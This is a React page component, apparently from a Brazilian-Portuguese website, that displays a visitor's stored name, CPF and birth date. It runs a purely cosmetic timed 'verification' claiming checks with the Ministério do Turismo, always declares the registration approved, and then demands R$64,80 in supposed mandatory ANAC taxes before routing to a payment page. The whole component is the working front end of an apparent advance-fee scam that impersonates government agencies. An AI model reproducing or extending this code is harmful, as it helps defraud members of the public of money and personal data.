import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { Loader2, Check } from "lucide-react";
import Header from "../components/Header";

interface UserData {
  nome: string;
  cpf: string;
  dataNascimento: string;
}

type VerificationStep = 'analyzing' | 'approved';

interface AnalysisStatus {
  id: number;
  message: string;
  completed: boolean;
}

export default function VerifyAvailability() {
  const [, setLocation] = useLocation();
  const [currentStatusIndex, setCurrentStatusIndex] = useState(0);
  const [verificationStep, setVerificationStep] = useState<VerificationStep>('analyzing');
  const [userData, setUserData] = useState<UserData | null>(null);

  const analysisSteps: AnalysisStatus[] = [
    { id: 1, message: "Verificando dados junto ao Ministério do Turismo", completed: false },
    { id: 2, message: "Consultando elegibilidade do CPF", completed: false },
    { id: 3, message: "Verificando disponibilidade do programa", completed: false },
    { id: 4, message: "Analisando documentação", completed: false }
  ];

  useEffect(() => {
    const storedData = localStorage.getItem('userData');
    if (storedData) {
      setUserData(JSON.parse(storedData));
    }

    const stepInterval = 2500;
    let currentStep = 0;

    const interval = setInterval(() => {
      if (currentStep < analysisSteps.length) {
        setCurrentStatusIndex(currentStep);
        currentStep++;
      } else {
        clearInterval(interval);
        setVerificationStep('approved');
      }
    }, stepInterval);

    return () => clearInterval(interval);
  }, []);

  const formatCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  const formatDate = (date: string) => {
    return new Date(date).toLocaleDateString('pt-BR');
  };

  const handleContinue = () => {
    setLocation('/pagamento');
  };

  return (
    <div>
      <Header />

      <div className="container mx-auto px-4 py-6">
        {userData && (
          <div className="max-w-4xl mx-auto bg-gray-50 p-8 rounded-lg shadow-lg min-h-[600px]">
            <div className="grid grid-cols-2 gap-4 mb-6">
              <div className="col-span-2">
                <label className="block text-sm font-medium text-gray-700">Nome Completo</label>
                <input
                  type="text"
                  value={userData.nome}
                  disabled
                  className="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700">CPF</label>
                <input
                  type="text"
                  value={formatCPF(userData.cpf)}
                  disabled
                  className="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700">Data de Nascimento</label>
                <input
                  type="text"
                  value={formatDate(userData.dataNascimento)}
                  disabled
                  className="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]"
                />
              </div>
            </div>

            <div className="mt-8 border-t border-gray-200 pt-8">
              {verificationStep === 'analyzing' && (
                <div className="space-y-6">
                  {analysisSteps.map((step, index) => (
                    <div
                      key={step.id}
                      className={`flex items-center gap-3 ${index > currentStatusIndex ? 'opacity-40' : ''}`}
                    >
                      {index === currentStatusIndex ? (
                        <Loader2 className="h-5 w-5 animate-spin text-green-600" />
                      ) : index < currentStatusIndex ? (
                        <div className="flex items-center justify-center w-6 h-6 rounded-full bg-green-100">
                          <Check className="h-4 w-4 text-green-600" />
                        </div>
                      ) : (
                        <div className="w-6 h-6 rounded-full border-2 border-gray-200" />
                      )}
                      <span className="font-medium">{step.message}</span>
                    </div>
                  ))}
                </div>
              )}

              {verificationStep === 'approved' && (
                <div className="space-y-6">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="flex items-center justify-center w-8 h-8 rounded-full bg-green-100">
                      <Check className="h-5 w-5 text-green-600" />
                    </div>
                    <h3 className="text-lg font-semibold text-green-900">
                      Cadastro Aprovado
                    </h3>
                  </div>
                  <p className="text-base text-green-800 mb-6">
                    <strong>Cadastro aprovado!</strong> Para finalizar, é necessário pagar os impostos obrigatórios da ANAC:
                  </p>
                  <div className="bg-white p-4 rounded-md mb-6">
                    <h4 className="font-semibold text-gray-800 mb-3">Impostos Obrigatórios:</h4>
                    <div className="space-y-2 text-sm text-gray-700">
                      <div className="flex justify-between items-start">
                        <span>• Tarifa de Fiscalização da<br />Aviação Civil (TFAC)</span>
                        <span className="font-bold whitespace-nowrap">R$28,40</span>
                      </div>
                      <div className="flex justify-between items-start">
                        <span>• ATAERO (Adicional de<br />Tarifa Aeroportuária)</span>
                        <span className="font-bold whitespace-nowrap">R$19,20</span>
                      </div>
                      <div className="flex justify-between items-start">
                        <span>• Impostos sobre passagem<br />(PIS/COFINS e ICMS)</span>
                        <span className="font-bold whitespace-nowrap">R$17,20</span>
                      </div>
                      <hr className="my-2" />
                      <div className="flex justify-between font-bold text-base">
                        <span>Total:</span>
                        <span className="whitespace-nowrap">R$64,80</span>
                      </div>
                    </div>
                  </div>
                  <button
                    className="w-full bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-md font-medium transition-colors text-[1.05rem]"
                    onClick={handleContinue}
                  >
                    Finalizar Cadastro
                  </button>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}